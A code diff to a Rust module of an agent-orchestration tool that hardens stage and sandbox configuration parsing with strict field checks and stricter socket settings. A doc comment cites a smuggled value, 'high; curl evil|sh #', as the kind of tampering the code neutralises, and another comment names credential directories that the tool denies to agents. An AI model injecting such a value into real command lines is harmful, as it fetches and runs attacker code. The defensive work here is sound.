@@ -3,6 +3,7 @@ use serde::{Deserialize, Deserializer, Serialize};
 use serde_json::Value;
 
 use crate::models::failure::FailureInfo;
+use crate::plan::schema::CodeReviewConfig;
 
 /// Type of stage for specialized handling.
 ///
@@ -91,6 +92,7 @@ pub enum ExecutionMode {
 /// Used in goal-backward verification to ensure critical connections
 /// between components are in place.
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct WiringCheck {
     /// Source file path (relative to working_dir)
     pub source: String,
@@ -245,6 +247,7 @@ impl std::fmt::Display for Implementers {
 
 /// Per-stage sandbox configuration (overrides plan-level defaults)
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct StageSandboxConfig {
     /// Override enabled setting for this stage
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -282,6 +285,7 @@ pub struct StageSandboxConfig {
 
 /// Filesystem access configuration
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct FilesystemConfig {
     /// Paths that agents cannot read (glob patterns)
     /// Default: ~/.ssh/**, ~/.aws/**, ~/.config/gcloud/**, ~/.gnupg/**
@@ -311,6 +315,7 @@ impl Default for FilesystemConfig {
 
 /// Network access configuration
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct NetworkConfig {
     /// Allowed network domains (glob patterns)
     /// Empty means no network access allowed
@@ -337,6 +342,7 @@ pub struct NetworkConfig {
 
 /// Linux-specific sandbox configuration
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct LinuxConfig {
     /// Enable weaker nested sandboxing for compatibility (default: false)
     /// Use this if running inside containers or VMs with restricted capabilities
@@ -353,13 +359,15 @@ where
     #[derive(Deserialize)]
     #[serde(untagged)]
     enum BoolOrVec {
-        #[allow(dead_code)]
         Bool(bool),
         Vec(Vec<String>),
     }
 
     match BoolOrVec::deserialize(deserializer)? {
-        BoolOrVec::Bool(_) => Ok(Vec::new()),
+        BoolOrVec::Bool(false) => Ok(Vec::new()),
+        BoolOrVec::Bool(true) => Err(serde::de::Error::custom(
+            "allow_unix_sockets: true is ambiguous; use allow_all_unix_sockets: true to allow all sockets, or provide an explicit path list",
+        )),
         BoolOrVec::Vec(v) => Ok(v),
     }
 }
@@ -405,6 +413,7 @@ fn default_deny_write() -> Vec<String> {
 /// TruthCheck allows verifying observable behaviors with more than just exit code.
 /// All extended fields are optional for backward compatibility.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct TruthCheck {
     /// Shell command to execute
     pub command: String,
@@ -469,6 +478,7 @@ impl std::fmt::Display for AcceptanceCriterion {
 ///
 /// Defines how to determine if a wiring test passed.
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct SuccessCriteria {
     /// Expected exit code (default: 0)
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -492,6 +502,7 @@ pub struct SuccessCriteria {
 /// Unlike WiringCheck (grep-based pattern matching), WiringTest runs
 /// actual commands to verify runtime behavior of component connections.
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct WiringTest {
     /// Human-readable name for this test
     pub name: String,
@@ -509,6 +520,7 @@ pub struct WiringTest {
 ///
 /// Runs a command and checks output for patterns indicating dead code.
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct DeadCodeCheck {
     /// Command to run for dead code detection (e.g., "cargo build --message-format=json")
     pub command: String,
@@ -525,6 +537,7 @@ pub struct DeadCodeCheck {
 /// When a stage is marked as `bug_fix: true`, a regression test must be defined
 /// to verify the fix is actually tested and won't regress.
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct RegressionTest {
     /// Path to the test file (relative to working_dir)
     pub file: String,
@@ -703,6 +716,9 @@ pub struct Stage {
     /// After-stage verification checks (post-conditions)
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub after_stage: Vec<TruthCheck>,
+    /// Structured review requirements for integration verification.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub code_review: Option<CodeReviewConfig>,
     /// Number of fix attempts made for this stage (acceptance/review cycles)
     #[serde(default)]
     pub fix_attempts: u32,
@@ -849,7 +865,7 @@ pub enum StageStatus {
 
     /// Stage's acceptance criterion was disputed; awaiting an
     /// adjudicator verdict. The dispute records live at
-    /// .work/disputes/<stage>/<n>/.
+    /// `.work/disputes/<stage>/<n>/`.
     #[serde(rename = "needs-adjudication")]
     NeedsAdjudication,
 }
@@ -1058,18 +1074,12 @@ impl StageStatus {
     }
 }
 
-/// Serde deserializer for [`Stage::reasoning_effort`] read back from disk.
-///
 /// `StageDefinition` (plan parse time) rejects an out-of-allowlist effort with a
 /// hard error, but a persisted `Stage` is re-read from `.work/stages/<id>.md` on
 /// every daemon restart, and that file is writable by a worktree agent. Without
 /// re-validation here, a tampered `reasoning_effort: "high; curl evil|sh #"` would
 /// survive reload and be concatenated into the spawn command line.
-///
-/// Unlike the plan-parse deserializer, this one does **not** fail the load on an
-/// invalid value (that would brick the whole daemon over one bad stage file).
-/// Instead it neutralizes the field to `None` (logging at `tracing::error!`), so
-/// `Stage::effective_reasoning_effort` falls back to the safe stage-type default.
+/// Invalid persisted values are neutralized rather than bricking daemon reload.
 fn deserialize_persisted_reasoning_effort<'de, D>(
     deserializer: D,
 ) -> Result<Option<String>, D::Error>
@@ -1141,6 +1151,7 @@ impl Default for Stage {
             dead_code_check: None,
             before_stage: Vec::new(),
             after_stage: Vec::new(),
+            code_review: None,
             fix_attempts: 0,
             dispute_count: 0,
             evidence_rounds: 0,
